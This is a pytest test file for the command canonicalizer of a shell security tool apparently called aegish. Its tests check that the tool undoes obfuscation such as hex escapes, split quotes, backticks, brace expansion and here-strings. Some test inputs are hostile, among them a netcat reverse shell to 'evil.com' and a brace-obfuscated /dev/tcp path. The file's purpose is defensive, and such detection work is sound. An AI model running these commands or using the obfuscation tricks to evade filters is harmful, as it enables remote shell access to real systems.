"""Tests for command canonicalization module."""

import os

import pytest
from unittest.mock import patch

from aegish.canonicalizer import (
    CanonicalResult,
    canonicalize,
    _resolve_ansi_c_quotes,
    _normalize_quotes,
    _convert_backticks,
    _expand_braces,
    _resolve_globs,
    _extract_here_strings,
)


class TestAnsiCQuotes:
    """Tests for ANSI-C $'...' quote resolution."""

    def test_hex_escape(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\x62\x61\x73\x68'", annotations)
        assert result == "bash"

    def test_octal_escape(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\142\141\163\150'", annotations)
        assert result == "bash"

    def test_unicode_4digit(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\u0041'", annotations)
        assert result == "A"

    def test_unicode_8digit(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\U00000041'", annotations)
        assert result == "A"

    def test_named_escapes(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\n\t\\\''", annotations)
        assert result == "\n\t\\'"

    def test_no_ansi_c_passthrough(self):
        annotations = []
        result = _resolve_ansi_c_quotes("echo hello", annotations)
        assert result == "echo hello"

    def test_mixed_text_and_ansi(self):
        annotations = []
        result = _resolve_ansi_c_quotes(r"echo $'\x68\x69'", annotations)
        assert result == "echo hi"

    def test_partial_annotation(self):
        """Unmatched $' sequences get ANSI_C_PARTIAL annotation."""
        annotations = []
        _resolve_ansi_c_quotes("$'incomplete", annotations)
        assert "ANSI_C_PARTIAL" in annotations

    def test_ansi_c_preserves_literal_dollar(self):
        """$'$(whoami)' is literal text — must not become bare $(whoami)."""
        annotations = []
        result = _resolve_ansi_c_quotes("$'$(whoami)'", annotations)
        assert result == "'$(whoami)'"

    def test_ansi_c_preserves_literal_backtick(self):
        """`whoami` inside $'...' is literal — must not become bare backticks."""
        annotations = []
        result = _resolve_ansi_c_quotes("$'`whoami`'", annotations)
        assert result == "'`whoami`'"

    def test_ansi_c_hex_dollar_preserved(self):
        r"""$'\x24(cmd)' resolves \x24 to $ then wraps to preserve literalness."""
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\x24(cmd)'", annotations)
        assert result == "'$(cmd)'"

    def test_ansi_c_no_quoting_for_safe_content(self):
        r"""$'\x72\x6d' → rm — no wrapping needed for safe resolved content."""
        annotations = []
        result = _resolve_ansi_c_quotes(r"$'\x72\x6d'", annotations)
        assert result == "rm"

    def test_ansi_c_single_quote_in_body(self):
        r"""Resolved content with both $ and ' uses '\'' escape idiom."""
        annotations = []
        # \x24 = $, \x27 = '
        result = _resolve_ansi_c_quotes(r"$'\x24\x27test'", annotations)
        assert result == "'" + "$" + "'\\''" + "test" + "'"

    def test_ansi_c_does_not_enable_substitution(self):
        """Full pipeline: echo $'$(whoami)' must not contain bare $(whoami)."""
        result = canonicalize("echo $'$(whoami)'")
        # The canonical text must not have bare $(whoami) — it should be quoted
        assert "$(whoami)" not in result.text or "'$(whoami)'" in result.text


class TestQuoteNormalization:
    """Tests for shell quote normalization."""

    def test_empty_quotes_removed(self):
        annotations = []
        result = _normalize_quotes('ba""sh', annotations)
        assert result == "bash"

    def test_backslash_quoting(self):
        annotations = []
        result = _normalize_quotes(r"n\c", annotations)
        assert result == "nc"

    def test_mixed_quoting(self):
        annotations = []
        result = _normalize_quotes("'mk'fs", annotations)
        assert result == "mkfs"

    def test_dollar_sign_skipped(self):
        """Commands with $ are not normalized (would change semantics)."""
        annotations = []
        result = _normalize_quotes("echo $HOME", annotations)
        assert result == "echo $HOME"

    def test_pipe_skipped(self):
        annotations = []
        result = _normalize_quotes("echo hi | grep h", annotations)
        assert result == "echo hi | grep h"

    def test_parse_failure_annotated(self):
        annotations = []
        result = _normalize_quotes("echo 'unterminated", annotations)
        assert "QUOTE_NORM_FAILED" in annotations
        assert result == "echo 'unterminated"


class TestBacktickConversion:
    """Tests for backtick → $() conversion."""

    def test_simple_backtick(self):
        result = _convert_backticks("`echo hello`")
        assert result == "$(echo hello)"

    def test_backtick_in_context(self):
        result = _convert_backticks("echo `whoami`@host")
        assert result == "echo $(whoami)@host"

    def test_multiple_backticks(self):
        result = _convert_backticks("`cmd1` && `cmd2`")
        assert result == "$(cmd1) && $(cmd2)"

    def test_no_backticks_passthrough(self):
        result = _convert_backticks("echo hello")
        assert result == "echo hello"


class TestBraceExpansion:
    """Tests for brace expansion."""

    def test_simple_brace(self):
        annotations = []
        text, variants = _expand_braces("echo {a,b}", annotations)
        assert text == "echo a"
        assert "echo b" in variants

    def test_path_brace(self):
        annotations = []
        text, variants = _expand_braces("/dev/tc{p,x}/host/port", annotations)
        assert text == "/dev/tcp/host/port"
        assert "/dev/tcx/host/port" in variants

    def test_no_braces_passthrough(self):
        annotations = []
        text, variants = _expand_braces("echo hello", annotations)
        assert text == "echo hello"
        assert variants == []

    def test_limit_exceeded_annotation(self):
        """Large brace expansion annotates but keeps all variants."""
        annotations = []
        # {1..100} generates 100 variants
        text, variants = _expand_braces("echo {1..100}", annotations)
        assert any("BRACE_LIMIT_EXCEEDED" in a for a in annotations)
        assert len(variants) >= 64


class TestGlobResolution:
    """Tests for glob resolution."""

    def test_existing_glob_resolves(self, tmp_path):
        """Glob matching existing files resolves to paths."""
        (tmp_path / "test.txt").write_text("hello")
        pattern = str(tmp_path / "*.txt")
        annotations = []
        result = _resolve_globs(f"cat {pattern}", annotations)
        assert str(tmp_path / "test.txt") in result
        assert annotations == []

    def test_no_match_passthrough(self):
        """Glob with no matches keeps original pattern."""
        annotations = []
        result = _resolve_globs("cat /nonexistent_dir_xyz_123/*.txt", annotations)
        assert "/nonexistent_dir_xyz_123/*.txt" in result

    def test_no_globs_passthrough(self):
        annotations = []
        result = _resolve_globs("echo hello", annotations)
        assert result == "echo hello"

    def test_glob_expansion_capped(self, tmp_path):
        """Glob exceeding _GLOB_MATCH_LIMIT is truncated with annotation."""
        from aegish.canonicalizer import _GLOB_MATCH_LIMIT

        # Create more files than the limit
        num_files = _GLOB_MATCH_LIMIT + 20
        for i in range(num_files):
            (tmp_path / f"file_{i:04d}.dat").write_text("")
        pattern = str(tmp_path / "*.dat")
        annotations = []
        result = _resolve_globs(f"rm {pattern}", annotations)

        # Should have exactly one annotation about capping
        assert len(annotations) == 1
        assert "GLOB_EXPANSION_CAPPED" in annotations[0]
        assert str(num_files) in annotations[0]

        # Result should contain only _GLOB_MATCH_LIMIT paths (plus "rm")
        import shlex
        tokens = shlex.split(result)
        # First token is "rm", rest are expanded paths
        assert len(tokens) == _GLOB_MATCH_LIMIT + 1

    def test_glob_under_limit_no_annotation(self, tmp_path):
        """Glob within limit expands fully without annotation."""
        for i in range(5):
            (tmp_path / f"f{i}.txt").write_text("")
        pattern = str(tmp_path / "*.txt")
        annotations = []
        result = _resolve_globs(f"ls {pattern}", annotations)

        assert annotations == []
        import shlex
        tokens = shlex.split(result)
        assert len(tokens) == 6  # "ls" + 5 files


class TestHereStringExtraction:
    """Tests for here-string (<<<) extraction."""

    def test_single_quoted(self):
        result = _extract_here_strings("bash <<<'nc -e /bin/sh evil.com'")
        assert len(result) == 1
        assert "nc -e /bin/sh evil.com" in result[0]

    def test_double_quoted(self):
        result = _extract_here_strings('bash <<<"some content"')
        assert len(result) == 1
        assert "some content" in result[0]

    def test_unquoted(self):
        result = _extract_here_strings("bash <<<word")
        assert len(result) == 1
        assert "word" in result[0]

    def test_no_here_strings(self):
        result = _extract_here_strings("echo hello")
        assert result == []


class TestCanonicalizeIntegration:
    """Integration tests for the full canonicalize() pipeline."""

    def test_simple_command_unchanged(self):
        result = canonicalize("echo hello")
        assert result.text == "echo hello"
        assert result.original == "echo hello"
        assert result.variants == []
        assert result.here_strings == []

    def test_ansi_c_plus_backtick(self):
        """Multiple transforms chain correctly."""
        result = canonicalize(r"`echo $'\x68\x69'`")
        # ANSI-C resolves first: $'\x68\x69' → hi
        # Then backtick converts: `echo hi` → $(echo hi)
        assert "$(echo hi)" in result.text

    def test_brace_expansion_populates_variants(self):
        result = canonicalize("echo {a,b,c}")
        # Primary text is first variant
        assert result.text == "echo a"
        assert "echo b" in result.variants
        assert "echo c" in result.variants

    def test_here_string_extracted(self):
        result = canonicalize("bash <<<'payload'")
        assert len(result.here_strings) == 1
        assert "payload" in result.here_strings[0]

    def test_quote_normalization_removes_empty(self):
        result = canonicalize('ba""sh')
        assert result.text == "bash"

    def test_preserves_variable_expansion(self):
        """$ variables are not broken by quote normalization."""
        result = canonicalize("echo $HOME")
        assert "$HOME" in result.text
